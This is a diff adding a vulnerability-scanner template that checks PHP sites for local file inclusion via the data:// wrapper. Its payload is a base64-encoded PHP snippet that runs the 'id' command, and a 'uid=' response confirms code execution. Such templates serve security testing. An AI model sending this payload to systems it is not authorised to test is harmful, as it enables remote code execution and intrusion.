@@ -1,0 +1,22 @@
+id: patt-lfi-wrap-data-01-include
+name: 'PATT lfi patt-lfi-wrap-data-01 via include'
+severity: critical
+type: active
+tags:
+  - lfi
+  - patt
+  - wrapperphp
+requires:
+  - php
+description: 'PATT data:// code execution (butuh allow_url_include). [patt:patt-lfi-wrap-data-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/Wrappers.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      include:
+        - 'data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
